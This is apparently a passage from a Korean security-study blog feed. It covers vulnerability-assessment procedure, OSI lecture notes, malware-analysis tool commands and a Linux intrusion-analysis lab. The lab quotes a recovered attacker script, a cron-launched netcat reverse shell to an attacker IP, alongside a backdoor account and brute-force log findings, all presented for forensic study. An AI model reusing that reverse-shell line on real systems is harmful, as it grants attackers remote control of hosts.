+&lt;/script&gt;</content><author><name>Useworld</name></author><summary type="html">SK -&amp;gt; AT&amp;amp;T SMS 보낼때 국가간 Protocol 변환시 인증정보 확인안함</summary></entry><entry><title type="html">보안취약점 진단 - 서버</title><link href="http://localhost:4000/2018/08/20/%EC%84%9C%EB%B2%84%EC%B7%A8%EC%95%BD%EC%A0%90%EC%A7%84%EB%8B%A8.html" rel="alternate" type="text/html" title="보안취약점 진단 - 서버" /><published>2018-08-20T00:00:00+09:00</published><updated>2018-08-20T00:00:00+09:00</updated><id>http://localhost:4000/2018/08/20/%EC%84%9C%EB%B2%84%EC%B7%A8%EC%95%BD%EC%A0%90%EC%A7%84%EB%8B%A8</id><content type="html" xml:base="http://localhost:4000/2018/08/20/%EC%84%9C%EB%B2%84%EC%B7%A8%EC%95%BD%EC%A0%90%EC%A7%84%EB%8B%A8.html">&lt;p&gt;명확한 기준 위반으로 취약이 아닌 이상
+인터뷰로 넣고 담당자와 이야기를 하자.
+취약 때려 박으면 발끈한다.&lt;/p&gt;
+
+&lt;p&gt;현황에 판단 기준도 넣고
+잘못된 부분은 글씨 진하게 or 빨간색으로 보기쉽게 하면 좋다.&lt;/p&gt;
+
+&lt;p&gt;업무 진행 절차는 숙지할것 시험나옴&lt;/p&gt;
+
+&lt;h3 id=&quot;취약점-진단-절차&quot;&gt;취약점 진단 절차&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;진단대상, 일정 수립&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;수행계획서는 신경 많이 안써도됨&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;요청사항(스크립트 전달 OS, DB, 네트워크 Config 요청, 보안장비는 인터뷰일정 협의)&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;보안담당자가 늦으면 3주짜리 프로젝트에서 2주째에 주는 경우도 있음 박터짐&lt;/p&gt;
+
+  &lt;p&gt;보안장비는 일정 협의를 바로 잡아야됨 전달받을게 없어서 1:1 인터뷰임&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;가이드 작성 보유, 템플릿도 제작을 해서 갖고 있어야됨&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;스크립트 결과물, 네트워크 config 받고 분석&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;1차 취약점 점검 보고서 만들고&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;취약한거랑 인터뷰 항목들을 담당자와 인터뷰, 리뷰하며 확인&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;인터뷰 반드시 진행&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;최종적으로 보고서를 작성(빈칸하고 인터뷰, 모름 이런거 있으면 안됨 나중에 PM한테 혼남)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;엑셀하고 워드도 있음&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;가이드와 최종보고서를 전달&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;PMS(Patch Management System)&lt;/p&gt;
+
+&lt;p&gt;DoA(Degree of Acceptance)&lt;/p&gt;
+
+&lt;p&gt;시험&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;취약점 진단 절차&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;진단대상, 일정 수립&lt;/p&gt;
+
+  &lt;p&gt;수행계획서&lt;/p&gt;
+
+  &lt;p&gt;요청사항(스크립트 전달, OS, DB, Network Config 요청, 보안장비 인터뷰 일정 협의)&lt;/p&gt;
+
+  &lt;p&gt;가이드, 템플릿 작성&lt;/p&gt;
+
+  &lt;p&gt;스크립트 결과물, Config 받아 분석&lt;/p&gt;
+
+  &lt;p&gt;1차 취약점 점검 결과 보고서 작성&lt;/p&gt;
+
+  &lt;p&gt;담당자와 인터뷰, 리뷰&lt;/p&gt;
+
+  &lt;p&gt;최종보고서 작성&lt;/p&gt;
+
+  &lt;p&gt;가이드 및 최종보고서 전달&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;파일 퍼미션 바꾸기 chmod&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;ftp 명령어 get, put&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;vi 명령어 dd, /, n&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;find 명령어&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;/etc/passwd, /etc/group 필드 정의&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;용어정의&lt;/p&gt;
+
+    &lt;ul&gt;
+      &lt;li&gt;AD : Active Directory
+        &lt;ul&gt;
+          &lt;li&gt;전체 자원을 중앙에서 관리 및 제어하기 위해 만든 서비스&lt;/li&gt;
+          &lt;li&gt;그룹 정책을 통한 도메인 내 보안/환경 설정을 관리할 수 있다.&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;PMS : Patch Management System
+        &lt;ul&gt;
+          &lt;li&gt;운영체제 및 어플리케이션에 대한 패치 또는 업데이트를 관리자가 일괄적으로 관리 가능하도록 보조하는 소프트웨어&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;WEB과 WAS 차이&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;진단 시 스크립트 결과 외 고려해야 할 사항&lt;/p&gt;
+
+    &lt;ul&gt;
+      &lt;li&gt;계정관리솔루션, 접근통제솔루션, 이중화(RAC), 보안감사솔루션(DBSafer), AD 등&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;apache 항목별 조치 방식&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;oracle 계정 정책(설정)&lt;/p&gt;
+
+    &lt;ul&gt;
+      &lt;li&gt;
+        &lt;p&gt;로그인 시도, 계정 잠금 failed attempts, lock&lt;/p&gt;
+      &lt;/li&gt;
+      &lt;li&gt;
+        &lt;p&gt;암호 사용 기간 설정 life&lt;/p&gt;
+      &lt;/li&gt;
+      &lt;li&gt;
+        &lt;p&gt;기존 암호 사용 못하게 reuse&lt;/p&gt;
+      &lt;/li&gt;
+      &lt;li&gt;
+        &lt;p&gt;세션 유효시간 설정 idle&lt;/p&gt;
+      &lt;/li&gt;
+      &lt;li&gt;
+        &lt;p&gt;패스워드 복잡성 설정 확인 verify&lt;/p&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Useworld</name></author><summary type="html">명확한 기준 위반으로 취약이 아닌 이상 인터뷰로 넣고 담당자와 이야기를 하자. 취약 때려 박으면 발끈한다.</summary></entry><entry><title type="html">보안취약점 진단 - 네트워크 및 보안장비</title><link href="http://localhost:4000/2018/08/14/%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC%EC%9E%A5%EB%B9%84%EC%A7%84%EB%8B%A8.html" rel="alternate" type="text/html" title="보안취약점 진단 - 네트워크 및 보안장비" /><published>2018-08-14T00:00:00+09:00</published><updated>2018-08-14T00:00:00+09:00</updated><id>http://localhost:4000/2018/08/14/%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC%EC%9E%A5%EB%B9%84%EC%A7%84%EB%8B%A8</id><content type="html" xml:base="http://localhost:4000/2018/08/14/%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC%EC%9E%A5%EB%B9%84%EC%A7%84%EB%8B%A8.html">&lt;p&gt;데이터 링크 계층. 어떤거냐 하면 랜카드야 랜카드 랜카드는 실제로 보면  1계층과 2계층에서 다 동작하는 장치야&lt;/p&gt;
+
+&lt;p&gt;다 기억하세요. 왜 실제 저 RJ45 커넥터가 연결되는게 어디야. 요게 랜카드에 있는 rj45 포트를 껴야되잖아 얘가 다 동작을 한단말야. 뒤에가서 다시 보겠지만 랜카드도 랜카드의 주소가 있어요&lt;/p&gt;
+
+&lt;p&gt;일명 하드웨어 주소라고도 하고 물리주소&lt;/p&gt;
+
+&lt;p&gt;그다음에 MAC Address 라고도 하죠 2계층부터 실제 주소의 개념이 등장을 합니다.&lt;/p&gt;
+
+&lt;p&gt;3계층에 가면 이제 논리적인 주소가 사용이 되요&lt;/p&gt;
+
+&lt;p&gt;얘는. 3계층의 주요 기능은 뭐냐하면 라우팅 이라고 하는거야 Routing.&lt;/p&gt;
+
+&lt;p&gt;경로 설정이라도해고 경로 배정이라도해도되고 경로 지정이라고 해도되고&lt;/p&gt;
+
+&lt;p&gt;하나의 소스 출발지 주소를 가지고 목적지까지 가야되요&lt;/p&gt;
+
+&lt;p&gt;1:1이라면 경로는 하나밖에 없잖아&lt;/p&gt;
+
+&lt;p&gt;실제 예를 들어서 아까도 예를들어서 우체국 예를 들면&lt;/p&gt;
+
+&lt;p&gt;서울에서 창원으로 보낸다고 쳐요. 서울에서 창원으로 가는 사이에 우체국 경로가 얼마나 있을까&lt;/p&gt;
+
+&lt;p&gt;서울에서 창원까지 가는 방법이. 그러면 실제 그 내에서 어떤 경로를 통해서 목적지까지 가는게&lt;/p&gt;
+
+&lt;p&gt;가장 최적의 경로일까? 라는 것을 결정하는것이 바로 라우팅 이라는 거에요.&lt;/p&gt;
+
+&lt;p&gt;결정이라고 하는게 바로 3계층의 가장 큰 기능입니다.&lt;/p&gt;
+
+&lt;p&gt;4계층 전송계층. 전송계층이야.&lt;/p&gt;
+
+&lt;p&gt;전송제어를 하죠 전송제어를 하는데. 실제 데이터 전송을 하는 부분은 아니죠.&lt;/p&gt;
+
+&lt;p&gt;실제 데이터 전송부분이아니고 저것도 데이터를 전송 하기 위한 논리적인 부분에 초점이 맞춰져있다고 보면되요.&lt;/p&gt;
+
+&lt;p&gt;이 OSI 7 Layer에서는 전송계층에서 정의할때 연결형이냐 비연결형이냐&lt;/p&gt;
+
+&lt;p&gt;전송을 하는중에 전송계층을 보면 좀더 안정적인 이런 전송이 제공이 되야된다라는거에요.&lt;/p&gt;
+
+&lt;p&gt;예를들어서 전송중에 전송중에 오류가 발생했다하면 어떻게해야될까요?&lt;/p&gt;
+
+&lt;p&gt;재전송을 해야되죠 재전송. 재전송을 누가하죠? 재전송을 누가해.&lt;/p&gt;
+
+&lt;p&gt;발신자측에서 해야죠. 발신자측에서. 실제 편지로 보면 우리가 편지를 보낼 때 편지봉투에 한장을 써서 보내는 사람도있고&lt;/p&gt;
+
+&lt;p&gt;두장 세장 네장도있지&lt;/p&gt;
+
+&lt;p&gt;실제 네트워크를 보면 한번에 전송할 수 있는 데이터 사이즈라는게 있어.&lt;/p&gt;
+
+&lt;p&gt;그걸 MTU라고해요. Maximum Transport Unit&lt;/p&gt;
+
+&lt;p&gt;내가 한번에 보낼 수 있는게 1000개다 실제 보내고자 하는게 5000개라고하면&lt;/p&gt;
+
+&lt;p&gt;패킷 5개로 나눠져야되죠? 1000개씩 5개.&lt;/p&gt;
+
+&lt;p&gt;원래 얘네 5개는 1개라 라는 것이 표시가 되야되잖아요.&lt;/p&gt;
+
+&lt;p&gt;이녀석은 원래 한개였네. 순서 번호라는게 있어야되죠. 편지 같은 경우에는 순서가 전도되서 도착될수도 있다고 했잖아요.&lt;/p&gt;
+
+&lt;p&gt;뭘 보고해야 돼. 순서번호를 보고 해야되잖아요.&lt;/p&gt;
+
+&lt;p&gt;요 부분은 바로 오류 제어부분하고 그다음에 흐름제어라는 부분이 있어요. 흐름제어는 Flow Control이라고 하죠.&lt;/p&gt;
+
+&lt;p&gt;지연씨한테 보낼라고 할거잖아요.&lt;/p&gt;
+
+&lt;p&gt;야 그렇게 빨리 보내면 어뜨케해! 뭐가되요? 넘치지. Overflow 가 발생한다고 하잖아.&lt;/p&gt;
+
+&lt;p&gt;내가 받을 수 있는 거는 요 컵 용량인데 요 CUP 용량이상으로 들어오면 넘쳐나잖아.&lt;/p&gt;
+
+&lt;p&gt;내가 너한테 보내는 거는 요속도로 보내려고해. 아 내가 받을 수 있는건 한번에 10개밖에안돼. 10개씩만 보내줘.&lt;/p&gt;
+
+&lt;p&gt;이런 것들을 바로 어디서한다 전송계층에서 한다 라는거야.&lt;/p&gt;
+
+&lt;p&gt;세션계층은 논리적인 부분이에요. 서로이제 통신을 하기 위해서 연결절차를 거쳤어요.&lt;/p&gt;
+
+&lt;p&gt;서로 확인을 했어요. 그러고나면 논리적인 연결부분이 형성이됐죠.&lt;/p&gt;
+
+&lt;p&gt;통신이 유지되게하는 계층이 바로 세션계층이에요.&lt;/p&gt;
+
+&lt;p&gt;여러분이 지금 네이버에 접속을 해서 무언가 여러분이 Search를 하려고해.&lt;/p&gt;
+
+&lt;p&gt;일반적으로 로그인 로그아웃 해요? 거의 없잖아.&lt;/p&gt;
+
+&lt;p&gt;그런데 내가 만약에 네이버에 접속해서 메일을 확인할라고해. 그럼 어떻게해?&lt;/p&gt;
+
+&lt;p&gt;로그인 로그아웃을 하잖아. 세션이 연결이 되는거야. 로그아웃 하기 전까지는 세션이 계속 유지가 되는거죠.&lt;/p&gt;
+
+&lt;p&gt;여러분이 로그아웃 계속 안했다고해서 유지가되요? 요런 부분들이 바로 세션이 유지가 된다라고 표현을 하는거에요.&lt;/p&gt;
+
+&lt;p&gt;그다음에 6계층은 표현계층입니다 표현계층. 뭐를 표현할거냐는거야.&lt;/p&gt;
+
+&lt;p&gt;정보를 표시하는 데이터 Format에 대한거야. Data Format. 예를들어 ASCII를 이용할건지 파일 타입있잖아&lt;/p&gt;
+
+&lt;p&gt;Data를 전송을 하는데 일반 파일형태로 갈건지 한번 전송을 하는데 한번에 보낼수 있는게 10Mb밖에 안된다&lt;/p&gt;
+
+&lt;p&gt;근데 내가 보낼건 11메가야 그럼 쪼개서 보내야된다. 아니면 ZIp파일로 만들어야지.&lt;/p&gt;
+
+&lt;p&gt;7계층 응용계층이에요 응용계층.&lt;/p&gt;
+
+&lt;p&gt;내 PC에 있는 어플리케이션을 의미하는게 아니에요. 아래아한글을 클릭했다 익스플로러를 클릭했다 이걸 얘기하는게 아니야.&lt;/p&gt;
+
+&lt;p&gt;최상위 사용자가 여러분들이 실제 내가 인터넷을 이용을 해서 누군가와 바로 지금 Instant Message를 이용해서 주고받는 그 과정들을 얘기하는거야.&lt;/p&gt;
+
+&lt;p&gt;선택하고 나서부터 걔가 동작하고 난 다음부터가 응용계층이야. 프로그램자체가 응용계층이라는게 아니라는거야.&lt;/p&gt;
+
+&lt;p&gt;최상위 계층부터 시작해서 최상위 계층이 7계층이에요 최하위 계층이 1계층이에요.&lt;/p&gt;
+
+&lt;p&gt;실제 통신은 7부터 7654321로 내려와서 목적지에가면 1234567이라는 과정을 거쳐서 상호 End System간의 통신이 이루어 진다 라는 이야기입니다.&lt;/p&gt;
+
+&lt;p&gt;요 부분이 OSI 7 Layer를 이용한 표준적인 개방형 시스템들이 등장한 요러한 배경이 되는 이야기에요.&lt;/p&gt;
+
+&lt;p&gt;TCP/IP&lt;/p&gt;
+
+&lt;p&gt;1,2계층 5,6,7계층 꼬옥 기억하세요~&lt;/p&gt;
+
+&lt;p&gt;smtp&lt;/p&gt;
+
+&lt;p&gt;다음중에서 tcp를 이용하지 않는 어플리케이션이 어떤거냐&lt;/p&gt;
+
+&lt;p&gt;다음중에서 udp를 이용하는 녀석은 어떤거냐 snmp tftp&lt;/p&gt;
+
+&lt;p&gt;ipv4 32bit&lt;/p&gt;
+
+&lt;p&gt;subnetmask&lt;/p&gt;
+
+&lt;p&gt;2^n-2&lt;/p&gt;
+
+&lt;p&gt;사설 IP 주소 꼭 기억해두시구요&lt;/p&gt;
+
+&lt;p&gt;ipv4 32bit&lt;/p&gt;
+
+&lt;p&gt;ipv6 128bit&lt;/p&gt;</content><author><name>Useworld</name></author><summary type="html">데이터 링크 계층. 어떤거냐 하면 랜카드야 랜카드 랜카드는 실제로 보면 1계층과 2계층에서 다 동작하는 장치야</summary></entry><entry><title type="html">악성코드 분석</title><link href="http://localhost:4000/2018/08/09/%EC%95%85%EC%84%B1%EC%BD%94%EB%93%9C%EB%B6%84%EC%84%9D.html" rel="alternate" type="text/html" title="악성코드 분석" /><published>2018-08-09T00:00:00+09:00</published><updated>2018-08-09T00:00:00+09:00</updated><id>http://localhost:4000/2018/08/09/%EC%95%85%EC%84%B1%EC%BD%94%EB%93%9C%EB%B6%84%EC%84%9D</id><content type="html" xml:base="http://localhost:4000/2018/08/09/%EC%95%85%EC%84%B1%EC%BD%94%EB%93%9C%EB%B6%84%EC%84%9D.html">&lt;h3 id=&quot;service&quot;&gt;Service&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;exe - services.exe&lt;/p&gt;
+
+  &lt;p&gt;dll - svchost.exe&lt;/p&gt;
+
+  &lt;p&gt;services.exe 하위에 svchost.exe 존재&lt;/p&gt;
+
+  &lt;p&gt;위장하기 위한 악성코드가 svchost.exe 인 경우 services.exe 하위가 아닌 따로 processl ist에 존재&lt;/p&gt;
+
+  &lt;p&gt;작업관리자는 부모관계 알 수 없음&lt;/p&gt;
+
+  &lt;p&gt;process explorer 사용&lt;/p&gt;
+
+  &lt;p&gt;악성코드에서 Mutex 사용 -&amp;gt; OpenMutex 시 이미 열려있으면 핸들값이 리턴됨&lt;/p&gt;
+
+  &lt;p&gt;JZ로 체크하여 실행되어 있는지 체크하여 중복 실행 방지&lt;/p&gt;
+
+  &lt;p&gt;DLL 실행 - Rundll32.exe DLL파일,Export API&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;rva-to-raw&quot;&gt;RVA to RAW&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;OllyDbg - 메모리&lt;/p&gt;
+
+  &lt;p&gt;IDA - 파일&lt;/p&gt;
+
+  &lt;p&gt;디버깅 중 디어셈블된 코드를 보고 싶을때 위치를 찾기 위해 계산&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;ubuntu-gdb-실습&quot;&gt;Ubuntu GDB 실습&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;nasm -felf32 hello.asm&lt;/p&gt;
+
+  &lt;p&gt;ld -I/lib/ld-linux.so.2 -lc –entry main hello.o&lt;/p&gt;
+
+  &lt;p&gt;nasm -felf32 exam1.asm&lt;/p&gt;
+
+  &lt;p&gt;ld –entry main exam1.asm&lt;/p&gt;
+
+  &lt;p&gt;nasm -felf32 exam2.asm &amp;amp;&amp;amp; ld –entry main exam2.o&lt;/p&gt;
+
+  &lt;p&gt;objdump -d a.out&lt;/p&gt;
+
+  &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+  &lt;p&gt;gdb -q a.out&lt;/p&gt;
+
+  &lt;p&gt;set disassembly-flavor intel - Intel 스타일로 바꾸기&lt;/p&gt;
+
+  &lt;p&gt;b main - BreakPoint&lt;/p&gt;
+
+  &lt;p&gt;ni - Next Instruction&lt;/p&gt;
+
+  &lt;p&gt;info reg - Information Register&lt;/p&gt;
+
+  &lt;p&gt;x/x - 데이터 보기&lt;/p&gt;
+
+  &lt;p&gt;x/10x - 10개 보기&lt;/p&gt;
+
+  &lt;p&gt;x/bx - 데이터를 byte로&lt;/p&gt;
+
+  &lt;p&gt;x/wx - 데이터를 word로&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;ollydbg&quot;&gt;OllyDbg&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;F2 : Breakpoint&lt;/p&gt;
+
+  &lt;p&gt;F7 : Step into&lt;/p&gt;
+
+  &lt;p&gt;F8 : Step over&lt;/p&gt;
+
+  &lt;p&gt;F9 : Run&lt;/p&gt;
+
+  &lt;p&gt;Ctrl + F9 : Return&lt;/p&gt;
+
+  &lt;p&gt;Ctrl + F2 : Restart&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;visual-studio-2015-configuration&quot;&gt;Visual Studio 2015 Configuration&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;Project Properties&lt;/strong&gt;&lt;/p&gt;
+
+  &lt;p&gt;C/C++&lt;/p&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;Code Generation&lt;/li&gt;
+    &lt;li&gt;Enable Minimal Rebuild : No&lt;/li&gt;
+    &lt;li&gt;Enable C++ Exceptions : No&lt;/li&gt;
+    &lt;li&gt;Basic Runtime Checks : Default&lt;/li&gt;
+    &lt;li&gt;Security Check : Disable Security Check&lt;/li&gt;
+    &lt;li&gt;Optimization&lt;/li&gt;
+    &lt;li&gt;Optimization : Disabled&lt;/li&gt;
+    &lt;li&gt;Advanced&lt;/li&gt;
+    &lt;li&gt;Compile As : Compile as C Code&lt;/li&gt;
+  &lt;/ul&gt;
+
+  &lt;p&gt;Linker&lt;/p&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;General&lt;/li&gt;
+    &lt;li&gt;
+      &lt;p&gt;Enable Incremental Linking : No&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li&gt;Advanced&lt;/li&gt;
+    &lt;li&gt;Randomized Base Address : No&lt;/li&gt;
+    &lt;li&gt;Data Execution Prevention : No&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;ida&quot;&gt;IDA&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;ul&gt;
+    &lt;li&gt;상호 참조 그래프&lt;/li&gt;
+  &lt;/ul&gt;
+
+  &lt;p&gt;View - Graphs - User xref charts… (Depth -1은 전체가 다 나오니 1, 2 정도로)&lt;/p&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;가상환경 탐지(VmWare)&lt;/li&gt;
+  &lt;/ul&gt;
+
+  &lt;p&gt;Assembly 명령어 in이 나오면 의심&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;volatility&quot;&gt;Volatility&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;vol.py -f Target.vmss &lt;strong&gt;imageinfo&lt;/strong&gt;&lt;/p&gt;
+
+  &lt;p&gt;OS 순정버전 낮은 버전부터 적용&lt;/p&gt;
+
+  &lt;p&gt;vol.py -f Target &lt;strong&gt;–profile=&lt;/strong&gt;Win7SP0x86 &lt;strong&gt;pslist&lt;/strong&gt; : 연결 리스트 방식&lt;/p&gt;
+
+  &lt;p&gt;vol.py -f Target –profile=Win7SP0x86 &lt;strong&gt;psscan&lt;/strong&gt; - 종료된 프로세스도 나옴(패턴 매치 방식)&lt;/p&gt;
+
+  &lt;p&gt;pslist에서 안보였는데 psscan에서 보인다 -&amp;gt; rootkit일 가능성이 높음&lt;/p&gt;
+
+  &lt;p&gt;vol.py -f Target –profile=Win7SP0x86 &lt;strong&gt;pstree&lt;/strong&gt; - 트리 구조 확인&lt;/p&gt;
+
+  &lt;p&gt;vol.py -f Target –profile=Win7SP0x86 &lt;strong&gt;psxview&lt;/strong&gt; - list와 scan을 같이 보여줌&lt;/p&gt;
+
+  &lt;p&gt;vol.py -f Target –profile=Win7SP0x86 &lt;strong&gt;cmdscan&lt;/strong&gt; - bash history 같은 것&lt;/p&gt;
+
+  &lt;p&gt;vol.py -f Target –profile=Win7SP0x86 &lt;strong&gt;cmdline&lt;/strong&gt;&lt;/p&gt;
+
+  &lt;p&gt;vol.py -f Target –profile=Win7SP0x86 &lt;strong&gt;mftparser&lt;/strong&gt; &amp;gt; .csv&lt;/p&gt;
+
+  &lt;p&gt;vol.py -f Target –profile=Win7SP0x86 &lt;strong&gt;dlllist&lt;/strong&gt; -p [pid]&lt;/p&gt;
+
+  &lt;p&gt;첫번째 중요한 명령 vol.py -f Target –profile=Win7SP0x86 &lt;strong&gt;memdump&lt;/strong&gt; -p [pid] -D [folder]&lt;/p&gt;
+
+  &lt;table&gt;
+    &lt;tbody&gt;
+      &lt;tr&gt;
+        &lt;td&gt;두번째 중요한 명령 vol.py -f Target –profile=Win7SP0x86 &lt;strong&gt;filescan&lt;/strong&gt;&lt;/td&gt;
+        &lt;td&gt;findstr “.png”&lt;/td&gt;
+      &lt;/tr&gt;
+    &lt;/tbody&gt;
+  &lt;/table&gt;
+
+  &lt;p&gt;vol.py -f Target –profile=Win7SP0x86 &lt;strong&gt;dumpfiles&lt;/strong&gt; -Q [address] (ex. 0x000000003fcdc038) -D ./&lt;/p&gt;
+
+  &lt;p&gt;덤프한 파일의 문자열을 추출 -&amp;gt; strings&lt;/p&gt;
+&lt;/blockquote&gt;</content><author><name>Useworld</name></author><summary type="html">Service</summary></entry><entry><title type="html">침해사고분석 - Linux</title><link href="http://localhost:4000/2018/08/07/%EC%B9%A8%ED%95%B4%EC%82%AC%EA%B3%A0%EB%B6%84%EC%84%9DLinux.html" rel="alternate" type="text/html" title="침해사고분석 - Linux" /><published>2018-08-07T00:00:00+09:00</published><updated>2018-08-07T00:00:00+09:00</updated><id>http://localhost:4000/2018/08/07/%EC%B9%A8%ED%95%B4%EC%82%AC%EA%B3%A0%EB%B6%84%EC%84%9DLinux</id><content type="html" xml:base="http://localhost:4000/2018/08/07/%EC%B9%A8%ED%95%B4%EC%82%AC%EA%B3%A0%EB%B6%84%EC%84%9DLinux.html">&lt;h3 id=&quot;linux-image-dump&quot;&gt;Linux Image Dump&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;ex) dd if=/dev/sda of=/mnt/hgfs/LinuxImage/linux.dd&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;실습&quot;&gt;실습&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;Victim IP&lt;/strong&gt;&lt;/p&gt;
+
+  &lt;p&gt;192.168.171.188&lt;/p&gt;
+
+  &lt;p&gt;&lt;strong&gt;Attacker IP&lt;/strong&gt;&lt;/p&gt;
+
+  &lt;p&gt;192.168.171.1, 192.168.171.146, 192.168.171.182&lt;/p&gt;
+
+  &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+  &lt;p&gt;&lt;strong&gt;crontab&lt;/strong&gt;&lt;/p&gt;
+
+  &lt;p&gt;/tmp/wow64.sh 쉘 스크립트 실행 등록&lt;/p&gt;
+
+  &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+  &lt;p&gt;&lt;strong&gt;wow64.sh&lt;/strong&gt;&lt;/p&gt;
+
+  &lt;p&gt;#!/bin/bash&lt;/p&gt;
+
+  &lt;p&gt;mknod /tmp/backpipe p&lt;/p&gt;
+
+  &lt;table&gt;
+    &lt;tbody&gt;
+      &lt;tr&gt;
+        &lt;td&gt;/bin/sh 0&amp;lt;/tmp/backpipe&lt;/td&gt;
+        &lt;td&gt;nc 192.168.171.1 5555 1&amp;gt;/tmp/backpipe&lt;/td&gt;
+      &lt;/tr&gt;
+    &lt;/tbody&gt;
+  &lt;/table&gt;
+
+  &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+  &lt;p&gt;&lt;strong&gt;/etc/passwd&lt;/strong&gt;&lt;/p&gt;
+
+  &lt;p&gt;infosechack 계정 root도 아닌데 gid가 0&lt;/p&gt;
+
+  &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+  &lt;p&gt;&lt;strong&gt;/var/log/auth.log&lt;/strong&gt;&lt;/p&gt;
+
+  &lt;p&gt;Nov 1 21:32:20 192.168.171.146&lt;/p&gt;
+
+  &lt;p&gt;ssh brute force attack&lt;/p&gt;
+
+  &lt;p&gt;Nov 1 21:41:02 192.168.171.1&lt;/p&gt;
+
+  &lt;ol&gt;
+    &lt;li&gt;Windows SSH Client로 SSH 접속&lt;/li&gt;
+    &lt;li&gt;root로 로그인 성공&lt;/li&gt;
+    &lt;li&gt;infosechack useradd 됨&lt;/li&gt;
+    &lt;li&gt;로그아웃 후 infosechack으로 다시 ssh 접속&lt;/li&gt;
+  &lt;/ol&gt;
+
+  &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+  &lt;p&gt;&lt;strong&gt;/var/log/access.log&lt;/strong&gt;&lt;/p&gt;
+
+  &lt;p&gt;Nov 1 21:19:16&lt;/p&gt;
+
+  &lt;p&gt;192.168.171.182&lt;/p&gt;
+
+  &lt;p&gt;vega 사용(brute force 툴)&lt;/p&gt;
+
+  &lt;p&gt;192.168.171.146&lt;/p&gt;
+
+  &lt;p&gt;w3af 사용(웹앱 공격 툴)&lt;/p&gt;
+
